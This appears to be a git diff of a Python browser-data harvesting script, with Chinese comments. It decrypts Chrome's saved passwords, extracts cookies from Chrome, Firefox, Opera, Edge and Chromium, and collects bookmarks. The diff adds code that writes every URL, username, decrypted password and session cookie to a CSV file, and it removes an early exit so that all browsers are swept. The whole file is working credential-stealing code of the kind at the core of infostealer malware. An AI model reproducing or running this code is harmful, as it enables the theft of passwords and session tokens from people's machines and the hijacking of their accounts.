@@ -10,6 +10,7 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import browser_cookie3
 import requests
+import csv
 
 #初始化地址
 if 'win' in sys.platform:
@@ -99,6 +100,7 @@ def decPassword(password, key): # 解密密码
             return ""
 
 def getPassword():  # 获取密码
+    csv_writer.writerow([ 'ID','【Chrome】url地址', '账号','密码','最后使用时间'])
     key = getEncKey()
     filename = "chromeLoginData.db"
     # 创建新chrome数据库文件，防止正在运行导致数据库锁定
@@ -107,20 +109,24 @@ def getPassword():  # 获取密码
     db.text_factory = str
     cursor = db.cursor()
     cursor.execute("select origin_url, username_value, password_value, date_last_used from logins order by date_created")
+    id=0
     for row in cursor.fetchall():
         url = row[0]
         username = row[1]
         password = decPassword(row[2], key)
         dateLastUsed = row[3]        
         if username or password:
+            id=id+1
             print("\nURL: "+url)
             print("Username: "+username)
             print("Password: "+password)
             print("Last Used: "+getChromeTime(dateLastUsed))
+            csv_writer.writerow([ id, url, username,password,getChromeTime(dateLastUsed)])
         else:
             continue
     cursor.close()
     db.close()
+    csv_writer.writerow(' ')
     try:
         os.remove(filename)
     except:
@@ -129,13 +135,14 @@ def getPassword():  # 获取密码
 def formatCookiejar(cookiejar):  # 格式化cookiejar对象并打印
     cookieList = str(cookiejar)[12:-3].split(">, <")
     newCookieList=[]
+    id=0
     for i in range(len(cookieList)):
-        temData=[]
-        temData.append(cookieList[i].split(" for ")[1])
-        temData.append(cookieList[i].split("Cookie ")[1].split("=")[0])
-        temData.append(cookieList[i].split("=")[1].split(" for ")[0])
-        newCookieList.append(temData)
-    [print('\nHost: %s\nName: %s\nCookie: %s'%(newCookieData[0],newCookieData[1],newCookieData[2])) for newCookieData in newCookieList]
+        id=id+1
+        host=cookieList[i].split(" for ")[1]
+        name=cookieList[i].split("Cookie ")[1].split("=")[0]
+        cookie=cookieList[i].split("=")[1].split(" for ")[0]
+        print('\nHost: %s\nName: %s\nCookie: %s'%(host,name,cookie))
+        csv_writer.writerow([ id, host, name, cookie])
 
 def getCookie():    # 获取cookie
     try:
@@ -144,38 +151,57 @@ def getCookie():    # 获取cookie
         getChromeCookie()
     except:
         try:
+            csv_writer.writerow([ 'ID','【Chrome】url地址', 'Name', 'Cookie'])
             formatCookiejar(chromeCookie)
+            csv_writer.writerow(' ')
         except:
             chromeCookie = []
+            csv_writer.writerow([ ' ','未检测到Chrome浏览器', ' ', ' '])
+            csv_writer.writerow(' ')
             print('\n未检测到Chrome浏览器')
-    sys.exit()
     try:
         firefoxCookie = browser_cookie3.firefox()
+        csv_writer.writerow([ 'ID','【Firefox】url地址', 'Name', 'Cookie'])
         print('\n\n-------------Firefox浏览器Cookie如下:-------------')
         formatCookiejar(firefoxCookie)
+        csv_writer.writerow(' ')
     except:
         firefoxCookie = []
+        csv_writer.writerow([ ' ','未检测到Firefox浏览器', ' ', ' '])
+        csv_writer.writerow(' ')
         print('\n未检测到Firefox浏览器')
     try:
         operaCookie =  browser_cookie3.opera()
+        csv_writer.writerow([ 'ID','【Opera】url地址', 'Name', 'Cookie'])
         print('\n\n-------------Opera浏览器Cookie如下:-------------')
         formatCookiejar(operaCookie)
+        csv_writer.writerow(' ')
     except:
         operaCookie = []
+        csv_writer.writerow([ ' ','未检测到Opera浏览器', ' ', ' '])
+        csv_writer.writerow(' ')
         print('\n未检测到Opera浏览器')
     try:
         edgeCookie =  browser_cookie3.edge()
+        csv_writer.writerow([ 'ID','【Edge】url地址', 'Name', 'Cookie'])
         print('\n\n-------------Edge浏览器Cookie如下:-------------')
         formatCookiejar(edgeCookie)
+        csv_writer.writerow(' ')
     except:
         edgeCookie = []
+        csv_writer.writerow([ ' ','未检测到Edge浏览器', ' ', ' '])
+        csv_writer.writerow(' ')
         print('\n未检测到Edge浏览器')
     try:
         chromiumCookie =  browser_cookie3.chromium()
+        csv_writer.writerow([ 'ID','【Chromium】url地址', 'Name', 'Cookie'])
         print('\n\n-------------Chromium浏览器Cookie如下:-------------')
         formatCookiejar(chromiumCookie)
+        csv_writer.writerow(' ')
     except:
         chromiumCookie = []
+        csv_writer.writerow([ ' ','未检测到Chromium浏览器', ' ', ' '])
+        csv_writer.writerow(' ')
         print('\n未检测到Chromium浏览器')
 
 #Chrome专属,可删除使用公用方法
@@ -185,6 +211,8 @@ def getChromeCookie():    # 获取cookie
     db = sqlite3.connect(filename)
     cursor = db.cursor()
     cursor.execute("select host_key,path,name,encrypted_value,expires_utc from cookies")#需新版sqlite3，否则会报错encrypted_value无法转utf-8
+    csv_writer.writerow([ 'ID','【Chrome】url地址', 'Path', 'Name', 'Cookie', '有效期'])
+    id=0
     for row in cursor.fetchall():
         try:
             host = row[0]
@@ -193,46 +221,59 @@ def getChromeCookie():    # 获取cookie
             encrypted_value = row[3]
             expires_utc =getChromeTime(row[4])
             if  encrypted_value:
+                id=id+1
                 print("\nHost: "+host)
                 print("Path: "+path)
                 print("Name: "+name)
                 try:
-                    print("Cookie: "+win32crypt.CryptUnprotectData(encrypted_value)[1].decode()) # Chrome80.X版本前解密方式
+                    cookie=win32crypt.CryptUnprotectData(encrypted_value)[1].decode() # Chrome80.X版本前解密方式
                 except Exception as e:
-                    print("Cookie: "+getDecCookie(encrypted_value)) # Chrome80.X版本后解密方式
+                    cookie=getDecCookie(encrypted_value) # Chrome80.X版本后解密方式
+                print("Cookie: "+cookie)
                 print("Expires: "+expires_utc)
+                csv_writer.writerow([ id, host, path, name, cookie, expires_utc])
         except:
             continue
     cursor.close()
     db.close()
+    csv_writer.writerow(' ')
     try:
         os.remove(filename)
     except:
         pass
 
-def forBookmarks(itemData): # 循环书签数据
+def forBookmarks(itemData,id): # 循环书签数据
     for item in itemData:
         type = item['type']
         name = item['name']
         if type == 'url':
+            id = id+1
             print('\nTitle: ',name, '\nUrl: ',item['url'])
+            csv_writer.writerow([ id,name,item['url']])
         else:   # 文件夹
-            forBookmarks(item['children'])
+            forBookmarks(item['children'],id)
 
 
 def getBookmarks(): # 获取书签
+    csv_writer.writerow([ 'ID','【Chrome】书签名', 'url地址'])
     with open(BookmarksPath, 'r',encoding = "utf-8") as f:
         itemData=json.loads(f.read())['roots']['bookmark_bar']['children']
-    forBookmarks(itemData)
+    id=0
+    forBookmarks(itemData,id)
+    csv_writer.writerow(' ')
     
 
-def main():#可根据需要把打印数据存xml文档
+def main():
     print('\n-------------Chrome浏览器书签如下:-------------')
     getBookmarks()
+    
     print('\n\n-------------Chrome浏览器密码如下:-------------')
     getPassword()
     print('\n\n-------------各浏览器Cookie如下:-------------')
     getCookie()
     
 if __name__ == "__main__":
-    main()
+    filename='./Result/bowserInfo.csv'
+    with open(filename, 'w', encoding='utf-8', newline='') as q:
+        csv_writer = csv.writer(q)
+        main()
